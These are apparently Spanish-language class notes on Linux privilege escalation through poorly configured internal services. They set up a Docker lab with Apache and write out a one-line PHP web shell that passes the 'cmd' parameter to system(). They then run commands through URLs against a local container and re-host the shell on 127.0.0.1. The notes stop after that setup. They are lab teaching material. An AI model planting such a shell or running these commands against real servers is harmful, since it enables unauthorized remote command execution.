- Tags: #escalada #escalada_privilegios #escalada_privilegios_linux #escalada_privilegios_linux_abuso_servicios #servicios

Los **servicios internos** son componentes esenciales que operan en segundo plano dentro de un sistema operativo, encargándose de funciones críticas como la gestión de red, impresión, actualización de software y monitoreo del sistema, entre otros.

No obstante, si estos servicios **no están configurados adecuadamente** y se encuentran activos, pueden representar una brecha de seguridad significativa. Los atacantes podrían explotar estos servicios para obtener acceso no autorizado al sistema y llevar a cabo actividades malintencionadas.

Un ejemplo concreto sería un servicio de red mal configurado con permisos elevados. Si un atacante logra identificarlo y hallar una forma de aprovecharlo, podría utilizarlo para escalar privilegios y obtener acceso de administrador.

En esta clase, analizaremos un caso ilustrativo de cómo un atacante podría, en primer lugar, detectar un servicio activo en el sistema y, posteriormente, explotarlo para incrementar sus privilegios de usuario.


Para ver puertos abiertos dentros de la maquiona
```bash

#Ver puertos abiertos
netstat -nat

#Ver los procesos que se estan ejecuntando
ps -faux
```

Situación 1

Nos montamos un servidor con docker que en el puerto 80 tendremos un servidor con apache2
```bash
docker run -dit --p80:80 --name openRedirect fcd77999de83


apt update
apt install apache2 php net-tools nano

cd /var/www/html
rm index.html
nano index.php
<?php 
	system($_GET['cmd']);
?>
```

Ya con esto podremos hacer peticiones al servidor y poder acceder a informacion dentro de la maquina
```
http://172.17.0.2/?cmd=whoami

#En ocaciones esto puede darnos poroblemas al momentos de ontener la respuesta por lo que se recomients urlencodear el &
http://172.17.0.2/?cmd=netstat -nat 2>&1

http://172.17.0.2/?cmd=netstat -nat 2>%261

```

![](../../../attachments/Pasted%20image%2020260221140302.png)

Esto es para simular que este servidor ya esta comprometido porque la idea es utilizar servicios que no esta expuestos al exterior si no que corren internamente. Esto lo simularemos con *php* creándonos un servidor interno.
```bash
#Nos copimos el index.php que esta en /var/www/html/index.php para /tmp
cp /var/www/html/index.php /tmp
mv index.php cmd.php   #Le cambiamos el nimbre

#Creamo un servidor en php por el port 8000 este se puede acceder desde afuera
php -S 0.0.0.0:8000   
```

![](../../../attachments/Pasted%20image%2020260221141231.png)

Pero lo que queremos es que sea un servicio interno para ver si podemos comprometerlo y leerlo
```bash
#Montamos el servidor php de manera interna para que pueda se accedido solo desde el servidor mismo

php -S 127.0.0.1:8000   
```

![](../../../attachments/Pasted%20image%2020260221141503.png)